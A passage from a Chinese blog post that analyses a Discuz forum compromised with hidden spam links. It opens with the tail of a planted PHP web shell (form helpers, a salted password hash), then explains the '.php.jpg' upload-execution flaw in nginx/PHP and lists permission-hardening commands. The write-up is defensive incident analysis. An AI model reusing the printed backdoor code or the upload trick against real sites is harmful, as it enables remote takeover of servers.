<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'target'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'target'</span>] ? <span style="color: #ad7fa8; font-style: italic;">"target=\"$arg[target]\""</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>] &amp;&amp; $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>] = <span style="color: #ad7fa8; font-style: italic;">'form1'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;'</span>.$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>].<span style="color: #ad7fa8; font-style: italic;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">maketext</span>($<span style="color: #eeeeec;">arg</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'cols'</span>] &amp;&amp; $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'cols'</span>] = <span style="color: #eeeeec; background-color: #2e3436;">100</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'rows'</span>] &amp;&amp; $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'rows'</span>] = <span style="color: #eeeeec; background-color: #2e3436;">25</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] = $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>] ? $<span style="color: #eeeeec;">arg</span>[<span style="color: #ad7fa8; font-style: italic;">'title'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;br /&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;"</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">formfooter</span>($<span style="color: #eeeeec;">name</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">name</span> &amp;&amp; $<span style="color: #eeeeec;">name</span> = <span style="color: #ad7fa8; font-style: italic;">'submit'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;&lt;input class="bt" name="'</span>.$<span style="color: #eeeeec;">name</span>.<span style="color: #ad7fa8; font-style: italic;">'" id="'</span>.$<span style="color: #eeeeec;">name</span>.<span style="color: #ad7fa8; font-style: italic;">'" type="submit" value="Submit"&gt;&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/form&gt;'</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">goback</span>(){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">self</span>, $<span style="color: #eeeeec;">nowpath</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="post"&gt;&lt;input type="hidden" name="action" value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span>.$<span style="color: #eeeeec;">nowpath</span>.<span style="color: #ad7fa8; font-style: italic;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">formfoot</span>(){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/form&gt;'</span>);
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">encode_pass</span>($<span style="color: #eeeeec;">pass</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">pass</span> = <span style="color: #eeeeec; background-color: #2e3436;">md5(</span><span style="color: #ad7fa8; font-style: italic;">'angel'</span>.$<span style="color: #eeeeec;">pass</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">pass</span> = <span style="color: #eeeeec; background-color: #2e3436;">md5(</span>$<span style="color: #eeeeec;">pass</span>.<span style="color: #ad7fa8; font-style: italic;">'angel'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">pass</span> = <span style="color: #eeeeec; background-color: #2e3436;">md5(</span><span style="color: #ad7fa8; font-style: italic;">'angel'</span>.$<span style="color: #eeeeec;">pass</span>.<span style="color: #ad7fa8; font-style: italic;">'angel'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">pass</span>;
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">pr</span>($<span style="color: #eeeeec;">s</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">"&lt;pre&gt;"</span>.<span style="color: #eeeeec; background-color: #2e3436;">print_r(</span>$<span style="color: #eeeeec;">s</span>).<span style="color: #ad7fa8; font-style: italic;">'&lt;/pre&gt;'</span>;
}

<span style="color: #729fcf;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #ad7fa8; font-style: italic;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #ad7fa8; font-style: italic;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #ad7fa8; font-style: italic;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc<sub>server</sub>/data/avatar
</li>
<li>uc<sub>server</sub>/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>

  </div>
  
  <footer class="article-footer">
    <nav class="tag-cloud">
      <ul>
	<li class="label label-inverse small"><a href="../../../tags/discuz.html">discuz</a></li><li class="label label-inverse small"><a href="../../../tags/security.html">security</a></li><li class="label label-inverse small"><a href="../../../tags/web.html">web</a></li>
      </ul>
    </nav>
    <span class="muted">
      发布于 <time datetime="2014-04-01T21:38:00Z"> 2014-04-01 21:38</time>
    </span>
  </footer>
  </div>
  <div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'kankananblog'; // required: replace example with your forum shortname
  var disqus_url = 'http://blog.kankanan.com/posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html';

  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>

      </div>
      <div id="sidebar" class="span3">
        <h5>最新文章</h5>
        <div id="recent-posts">
          <ul>
            <li><a href="../../../posts/2014/12/09_740689e3node2ejs4e2d7684error5bf98c61.html">理解node.js中的Error对象</a></li> <li><a href="../../../posts/2014/09/23_5728linux4f7f7528nfs63028f7d51765b83linux673a56684e0a768465874ef65939.html">在linux使用nfs挂载其它linux机器上的文件夹</a></li> <li><a href="../../../posts/2014/09/22_thinkpad-t540p4fee590dlinux4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html">Thinkpad T540p修复linux下触摸板按下时光标位置移动问题</a></li> <li><a href="../../../posts/2014/09/19_linux4e0b4fee6539952e4f4d66205c04.html">linux下修改键位映射</a></li> <li><a href="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html">论坛被挂暗链问题分析与解决</a></li> <li><a href="../../../posts/2014/03/12_archlinux7f517edc63a553e34e0a51fa73b04e244e2aip.html">Archlinux网络接口上出现两个IP</a></li> <li><a href="../../../posts/2014/03/10_5f006e90987976ee7ba174067cfb7edfff1atrac.html">开源项目管理系统：trac</a></li> <li><a href="../../../index.html">python应用国际化：Babel</a></li> <li><a href="../../../posts/2014/03/07_centos-62e44e0b5b8988c5redmine.html">CentOS 6.4下安装redmine</a></li> <li><a href="../../../posts/2014/02/17_7f168bd15b8988c5redis.html">编译安装redis</a></li> 
          </ul>
        </div>
	    <h5>标签</h5>
        <div id="tags">
	      <ul>
  <li style="font-size: 160.00%;"><a href="../../../tags/archlinux.html">archlinux</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/babel.html">babel</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/bitbucket.html">bitbucket</a></li> <li style="font-size: 100.00%;"><a href="../../../tags/c.html">c</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/chosen.html">chosen</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/comet.html">comet</a></li> <li style="font-size: 100.00%;"><a href="../../../tags/cpp.html">cpp</a></li> <li style="font-size: 100.00%;"><a href="../../../tags/discuz.html">discuz</a></li> <li style="font-size: 100.00%;"><a href="../../../tags/emacs.html">emacs</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/english.html">english</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/fcitx.html">fcitx</a></li> <li style="font-size: 100.00%;"><a href="../../../tags/hash.html">hash</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/hg.html">hg</a></li> <li style="font-size: 100.00%;"><a href="../../../tags/http.html">http</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/jabber.html">jabber</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/jquery.html">jquery</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/keyboard.html">keyboard</a></li> <li style="font-size: 220.00%;"><a href="../../../tags/linux.html">linux</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/log4cxx.html">log4cxx</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/log4php.html">log4php</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/memcached.html">memcached</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/mongodb.html">mongodb</a></li> <li style="font-size: 120.00%;"><a href="../../../tags/mysql.html">mysql</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/network.html">network</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/nfs.html">nfs</a></li> <li style="font-size: 120.00%;"><a href="../../../tags/nginx.html">nginx</a></li> <li style="font-size: 160.00%;"><a href="../../../tags/node.html">node</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/o-blog.html">o-blog</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/openssl.html">openssl</a></li> <li style="font-size: 140.00%;"><a href="../../../tags/php.html">php</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/pomodoro.html">pomodoro</a></li> <li style="font-size: 160.00%;"><a href="../../../tags/python.html">python</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/qrcode.html">qrcode</a></li> <li style="font-size: 160.00%;"><a href="../../../tags/redis.html">redis</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/redmine.html">redmine</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/security.html">security</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/spdy.html">spdy</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/thinkpad.html">thinkpad</a></li> <li style="font-size: 80.00%;"><a href="../../../tags/trac.html">trac</a></li> <li style="font-size: 140.00%;"><a href="../../../tags/web.html">web</a></li> 
</ul>

        </div>
        <h5>最新评论</h5>
        <div id="recent-comments">
          <script src="http://kankananblog.disqus.com/recent_comments_widget.js?num_items=5&hide_avatars=0&avatar_size=32&excerpt_length=100" type="text/javascript"></script>
        </div>
      </div>
    </div>
  </div>
  <div id="footer">
	<div class="copyright" style="text-align: center;">
	  <p>
版权所有 © 2011-2013 看看俺 – KanKanAn.com
</p>

	  <p>Powered by <a href="https://github.com/renard/o-blog">o-blog</a>.</p>
	</div>
  </div>
</body>
</html>

